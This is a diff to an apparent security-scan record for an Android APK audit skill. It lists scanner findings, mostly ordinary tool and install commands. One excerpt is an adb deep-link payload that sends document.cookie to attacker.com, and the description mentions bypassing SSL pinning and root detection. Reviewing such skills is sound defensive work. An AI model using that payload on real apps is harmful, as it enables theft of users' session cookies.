@@ -4,7 +4,7 @@
   "repo": "kimi-code-security",
   "path": ".agents/skills/android-apk-audit",
   "name": "android-apk-audit",
-  "description": "",
+  "description": "Comprehensive Android APK security audit with static analysis, dynamic instrumentation, source-to-sink tracing, IPC/component abuse analysis, and CVSS 4.0 reporting. Covers decompilation, manifest analysis, deep links and intent injection, secrets detection, crypto analysis, Frida/Objection integration, and APK repackaging. Use when user says \"audit APK\", \"analyze android app\", \"mobile pentest\", \"APK security\", \"decompile APK\", \"android vulnerability assessment\", \"reverse engineer android\", \"modify APK\", \"intent injection\", \"deep link abuse\", \"bypass SSL pinning\", \"bypass root detection\", or provides an APK for security review, decompiled Android sources, or decoded resources.",
   "stars": 18,
   "category": "security",
   "commit": "cac122702fd7c1bb910d4331d42d31f4d65ef199",
@@ -12,16 +12,696 @@
   "repoCreatedAt": "2026-07-09T13:36:20Z",
   "alsoFoundIn": [],
   "status": "ok",
-  "incomplete": true,
-  "scannedAt": "2026-11-23T11:25:12.649Z",
+  "incomplete": false,
+  "scannedAt": "2026-11-28T10:59:08.925Z",
   "scan": {
-    "findings": [],
-    "findingTotals": {},
-    "score": 100,
-    "band": "low",
+    "findings": [
+      {
+        "ruleId": "shell",
+        "file": ".agents/skills/android-apk-audit/SKILL.md",
+        "line": 107,
+        "excerpt": "apktool d app.apk -o decoded/         # Decode resources + smali",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": ".agents/skills/android-apk-audit/SKILL.md",
+        "line": 140,
+        "excerpt": "cat decoded/AndroidManifest.xml",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": ".agents/skills/android-apk-audit/SKILL.md",
+        "line": 190,
+        "excerpt": "grep -iE \"(key|token|secret|password|api)\" decoded/res/values/strings.xml",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": ".agents/skills/android-apk-audit/SKILL.md",
+        "line": 259,
+        "excerpt": "frida -U -f com.example.app -l script.js",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": ".agents/skills/android-apk-audit/SKILL.md",
+        "line": 278,
+        "excerpt": "python3 scripts/frida-exploit-helper.py -p com.target.app --script ssl-pinning-bypass",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": ".agents/skills/android-apk-audit/SKILL.md",
+        "line": 324,
+        "excerpt": "pip install jnitrace",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": ".agents/skills/android-apk-audit/SKILL.md",
+        "line": 324,
+        "excerpt": "pip install jnitrace",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": ".agents/skills/android-apk-audit/SKILL.md",
+        "line": 341,
+        "excerpt": "npm install jnitrace-engine",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": ".agents/skills/android-apk-audit/SKILL.md",
+        "line": 355,
+        "excerpt": "objection -g com.example.app explore",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": ".agents/skills/android-apk-audit/SKILL.md",
+        "line": 371,
+        "excerpt": "adb shell am start -n com.example.app/.MainActivity -a android.intent.action.VIEW -d \"scheme://host\"",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": ".agents/skills/android-apk-audit/SKILL.md",
+        "line": 514,
+        "excerpt": "apktool d app.apk -o app-modified/",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": ".agents/skills/android-apk-audit/SKILL.md",
+        "line": 538,
+        "excerpt": "apktool b app-modified/ -o app-modified.apk",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": ".agents/skills/android-apk-audit/SKILL.md",
+        "line": 544,
+        "excerpt": "keytool -genkeypair -v -keystore my-release-key.jks -alias androiddebugkey -keyalg RSA -keysize 2048 -validity 10000",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": ".agents/skills/android-apk-audit/SKILL.md",
+        "line": 563,
+        "excerpt": "adb install -r app-signed.apk",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": ".agents/skills/android-apk-audit/SKILL.md",
+        "line": 574,
+        "excerpt": "apktool d -f app.apk -o decoded/ -api 35  # Force mode with target Android API",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": ".agents/skills/android-apk-audit/SKILL.md",
+        "line": 582,
+        "excerpt": "jadx --show-bad-code -v app.apk           # Show code even with errors",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": ".agents/skills/android-apk-audit/SKILL.md",
+        "line": 589,
+        "excerpt": "adb shell ps -A | grep frida",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": ".agents/skills/android-apk-audit/assets/frida-scripts/network-interceptor.js",
+        "line": 745,
+        "excerpt": "var HttpClient = Java.use(\"org.apache.http.client.HttpClient\");",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": ".agents/skills/android-apk-audit/assets/frida-scripts/network-interceptor.js",
+        "line": 747,
+        "excerpt": "var originalApacheExecute = HttpClient.execute.overload('org.apache.http.client.methods.HttpUriRequest');",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": ".agents/skills/android-apk-audit/assets/frida-scripts/network-interceptor.js",
+        "line": 764,
+        "excerpt": "console.log(\"[+] org.apache.http.client.HttpClient hooked (LEGACY - API <23 only)\");",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": ".agents/skills/android-apk-audit/references/ai-prompts/exploit-generator.md",
+        "line": 114,
+        "excerpt": "\"command\": \"adb shell am start -n com.example.app/.MainActivity -d 'javascript:fetch(\\\"https://attacker.com/?cookie=\\\"+document.cookie)'\",",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "attacker.com"
+        ]
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": ".agents/skills/android-apk-audit/references/android-15-security-guide.md",
+        "line": 46,
+        "excerpt": "- **Frida** (>= 16.0): `npm install -g frida frida-tools`",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": ".agents/skills/android-apk-audit/references/android-15-security-guide.md",
+        "line": 59,
+        "excerpt": "npm install -g frida frida-tools",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": ".agents/skills/android-apk-audit/references/android-16-security-guide.md",
+        "line": 370,
+        "excerpt": "result = subprocess.run(",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": ".agents/skills/android-apk-audit/references/android-version-security.md",
+        "line": 809,
+        "excerpt": "cat >> ~/.bashrc << 'EOF'",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": ".agents/skills/android-apk-audit/references/automation-scripts.md",
+        "line": 44,
+        "excerpt": "echo \"Install with: apt install ${missing[*]}\"",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": ".agents/skills/android-apk-audit/references/automation-scripts.md",
+        "line": 124,
+        "excerpt": "echo \"[✗] $tool: NOT INSTALLED (apt install $package)\"",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": ".agents/skills/android-apk-audit/references/automation-scripts.md",
+        "line": 172,
+        "excerpt": "python3 -c \"import androguard; print('[✓] androguard: ' + androguard.__version__)\" 2>/dev/null || echo \"[✗] androguard: NOT INSTALLED (pip install androguard)\"",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": ".agents/skills/android-apk-audit/references/automation-scripts.md",
+        "line": 173,
+        "excerpt": "python3 -c \"import frida; print('[✓] frida-python: ' + frida.__version__)\" 2>/dev/null || echo \"[✗] frida-python: NOT INSTALLED (pip install frida)\"",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": ".agents/skills/android-apk-audit/references/automation-scripts.md",
+        "line": 174,
+        "excerpt": "python3 -c \"import objection; print('[✓] objection')\" 2>/dev/null || echo \"[✗] objection: NOT INSTALLED (pip install objection)\"",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": ".agents/skills/android-apk-audit/references/automation-scripts.md",
+        "line": 385,
+        "excerpt": "print(\"Install: pip install androguard\")",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": ".agents/skills/android-apk-audit/references/automation-scripts.md",
+        "line": 626,
+        "excerpt": "response = requests.post(",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": ".agents/skills/android-apk-audit/references/automation-scripts.md",
+        "line": 638,
+        "excerpt": "response = requests.get(endpoint, headers=self.headers, verify=False)",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": ".agents/skills/android-apk-audit/references/automation-scripts.md",
+        "line": 645,
+        "excerpt": "response = requests.get(",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": ".agents/skills/android-apk-audit/references/automation-scripts.md",
+        "line": 730,
+        "excerpt": "- apt-get update && apt-get install -y apktool jadx apkid python3-pip",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": ".agents/skills/android-apk-audit/references/automation-scripts.md",
+        "line": 731,
+        "excerpt": "- pip3 install androguard frida-tools",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": ".agents/skills/android-apk-audit/references/automation-scripts.md",
+        "line": 760,
+        "excerpt": "- apt-get update && apt-get install -y adb frida-tools objection",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": ".agents/skills/android-apk-audit/references/automation-scripts.md",
+        "line": 789,
+        "excerpt": "- pip install jinja2 weasyprint",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": ".agents/skills/android-apk-audit/references/automation-scripts.md",
+        "line": 826,
+        "excerpt": "apt-get install -y apktool jadx apkid python3-pip adb",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": ".agents/skills/android-apk-audit/references/automation-scripts.md",
+        "line": 827,
+        "excerpt": "pip3 install androguard frida-tools",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": ".agents/skills/android-apk-audit/references/automation-scripts.md",
+        "line": 833,
+        "excerpt": "wget -O artifacts/app.apk ${{ secrets.APK_DOWNLOAD_URL }}",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": ".agents/skills/android-apk-audit/references/automation-scripts.md",
+        "line": 870,
+        "excerpt": "run: pip3 install frida-tools objection",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": ".agents/skills/android-apk-audit/references/automation-scripts.md",
+        "line": 878,
+        "excerpt": "FRIDA_VERSION=$(curl -s https://api.github.com/repos/frida/frida/releases/latest | grep '\"tag_name\"' | sed -E 's/.*\"([^\"]+)\".*/\\1/')",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "api.github.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": ".agents/skills/android-apk-audit/references/automation-scripts.md",
+        "line": 879,
+        "excerpt": "wget \"https://github.com/frida/frida/releases/download/${FRIDA_VERSION}/frida-server-${FRIDA_VERSION}-android-x86_64.xz\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "github.com"
+        ]
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": ".agents/skills/android-apk-audit/references/automation-scripts.md",
+        "line": 918,
+        "excerpt": "pip install jinja2 weasyprint",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": ".agents/skills/android-apk-audit/references/automation-scripts.md",
+        "line": 1316,
+        "excerpt": "apt-get install -y apktool jadx apkid python3-pip adb",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": ".agents/skills/android-apk-audit/references/automation-scripts.md",
+        "line": 1317,
+        "excerpt": "pip3 install androguard frida-tools",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": ".agents/skills/android-apk-audit/references/burp-mobsf-integration-guide.md",
+        "line": 43,
+        "excerpt": "curl -s http://localhost:8000/api/v1/user_data --connect-timeout 5 || echo \"MobSF not reachable at localhost:8000\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": ".agents/skills/android-apk-audit/references/burp-mobsf-integration-guide.md",
+        "line": 67,
+        "excerpt": "pip install requests --break-system-packages",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": ".agents/skills/android-apk-audit/references/burp-mobsf-integration-guide.md",
+        "line": 70,
+        "excerpt": "curl http://localhost:8000/api/v1/user_data",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": ".agents/skills/android-apk-audit/references/ci-cd-integration.md",
+        "line": 419,
+        "excerpt": "response = requests.post(f\"{MOBSF_URL}/api/v1/upload\", files=files, data=data)",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": ".agents/skills/android-apk-audit/references/ci-cd-integration.md",
+        "line": 424,
+        "excerpt": "response = requests.post(f\"{MOBSF_URL}/api/v1/scan\", data=data)",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": ".agents/skills/android-apk-audit/references/ci-cd-integration.md",
+        "line": 429,
+        "excerpt": "response = requests.post(f\"{MOBSF_URL}/api/v1/download_pdf\", data=data)",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": ".agents/skills/android-apk-audit/references/ci-cd-integration.md",
+        "line": 633,
+        "excerpt": "requests.post(SLACK_WEBHOOK_URL, json=payload)",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": ".agents/skills/android-apk-audit/references/cross-platform-testing-setup.md",
+        "line": 177,
+        "excerpt": "/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "raw.githubusercontent.com"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": ".agents/skills/android-apk-audit/references/cross-platform-testing-setup.md",
+        "line": 177,
+        "excerpt": "/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": ".agents/skills/android-apk-audit/references/cross-platform-testing-setup.md",
+        "line": 196,
+        "excerpt": "echo 'export ANDROID_HOME=/opt/homebrew/opt/android-sdk' >> ~/.zshrc",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": ".agents/skills/android-apk-audit/references/cross-platform-testing-setup.md",
+        "line": 197,
+        "excerpt": "echo 'export PATH=$PATH:$ANDROID_HOME/platform-tools' >> ~/.zshrc",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": ".agents/skills/android-apk-audit/references/cross-platform-testing-setup.md",
+        "line": 229,
+        "excerpt": "echo 'export ANDROID_HOME=/opt/homebrew/opt/android-sdk' >> ~/.zshrc",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": ".agents/skills/android-apk-audit/references/cross-platform-testing-setup.md",
+        "line": 230,
+        "excerpt": "echo 'export PATH=$PATH:$ANDROID_HOME/platform-tools' >> ~/.zshrc",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": ".agents/skills/android-apk-audit/references/cross-platform-testing-setup.md",
+        "line": 366,
+        "excerpt": "sudo tee /etc/wsl.conf > /dev/null << 'EOF'",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": ".agents/skills/android-apk-audit/references/cross-platform-testing-setup.md",
+        "line": 451,
+        "excerpt": "subprocess.run([\"apktool\", \"d\", \"app.apk\", \"-o\", output_dir])",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": ".agents/skills/android-apk-audit/references/dynamic-analysis-setup.md",
+        "line": 194,
+        "excerpt": "wget https://github.com/frida/frida/releases/download/${FRIDA_VER}/frida-server-${FRIDA_VER}-android-arm64.xz",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "github.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": ".agents/skills/android-apk-audit/references/firebase-security.md",
+        "line": 138,
+        "excerpt": "curl -s \"https://your-project.firebaseio.com/.json\" | jq '.'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "your-project.firebaseio.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": ".agents/skills/android-apk-audit/references/firebase-security.md",
+        "line": 141,
+        "excerpt": "curl -s \"https://your-project.firebaseio.com/users/.json\" | jq '.'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "your-project.firebaseio.com"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": ".agents/skills/android-apk-audit/references/fuzzing-guide.md",
+        "line": 365,
+        "excerpt": "subprocess.run(cmd, shell=True, timeout=5)",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": ".agents/skills/android-apk-audit/references/opencode-tooling.md",
+        "line": 43,
+        "excerpt": "sudo ln -s /opt/jadx/bin/jadx /usr/local/bin/jadx",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": ".agents/skills/android-apk-audit/references/opencode-tooling.md",
+        "line": 44,
+        "excerpt": "sudo ln -s /opt/jadx/bin/jadx-gui /usr/local/bin/jadx-gui",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": ".agents/skills/android-apk-audit/references/opencode-tooling.md",
+        "line": 61,
+        "excerpt": "sudo ln -s /opt/jadx/bin/jadx /usr/local/bin/jadx",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": ".agents/skills/android-apk-audit/references/opencode-tooling.md",
+        "line": 62,
+        "excerpt": "sudo ln -s /opt/jadx/bin/jadx-gui /usr/local/bin/jadx-gui",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": ".agents/skills/android-apk-audit/references/opencode-tooling.md",
+        "line": 78,
+        "excerpt": "echo 'export PATH=\"$HOME/jadx/bin:$PATH\"' >> ~/.bashrc",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": ".agents/skills/android-apk-audit/references/opencode-tooling.md",
+        "line": 730,
+        "excerpt": "echo 'export PATH=\"$PATH:/c/Program Files/Android/platform-tools\"' >> ~/.bashrc",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": ".agents/skills/android-apk-audit/references/opencode-tooling.md",
+        "line": 759,
+        "excerpt": "sudo ln -sf /opt/jadx/bin/jadx /usr/local/bin/jadx && \\",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": ".agents/skills/android-apk-audit/references/tool-installation.md",
+        "line": 197,
+        "excerpt": "echo 'export PATH=\"/opt/jadx/bin:$PATH\"' >> ~/.bashrc",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": ".agents/skills/android-apk-audit/references/tool-installation.md",
+        "line": 212,
+        "excerpt": "echo 'export PATH=\"$HOME/.local/bin:$PATH\"' >> ~/.bashrc",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": ".agents/skills/android-apk-audit/references/tool-installation.md",
+        "line": 220,
+        "excerpt": "mkdir -p ~/android-sdk",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": ".agents/skills/android-apk-audit/references/tool-installation.md",
+        "line": 241,
+        "excerpt": "cat >> ~/.bashrc << 'EOF'",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": ".agents/skills/android-apk-audit/references/tool-installation.md",
+        "line": 263,
+        "excerpt": "wget -qO - https://packages.adoptium.net/artifactory/api/gpg/key/public | sudo tee /etc/apt/keyrings/adoptium.asc",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": ".agents/skills/android-apk-audit/references/tool-installation.md",
+        "line": 264,
+        "excerpt": "echo \"deb [signed-by=/etc/apt/keyrings/adoptium.asc] https://packages.adoptium.net/artifactory/deb $(source /etc/os-release && echo $UBUNTU_CODENAME) main\" | su",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": ".agents/skills/android-apk-audit/references/tool-installation.md",
+        "line": 329,
+        "excerpt": "echo 'export PATH=\"/opt/jadx/bin:$PATH\"' >> ~/.bashrc",
+        "disclosed": false,
+        "automatic": false
+      }
+    ],
+    "findingTotals": {
+      "shell": 35,
+      "downloads-code": 230,
+      "network": 111,
+      "writes-outside": 25
+    },
+    "score": 67,
+    "band": "review",
     "rulesVersion": "1.3.0",
-    "filesScanned": 6,
-    "filesSkipped": 133
+    "filesScanned": 139,
+    "filesSkipped": 0
   },
   "history": [
     {
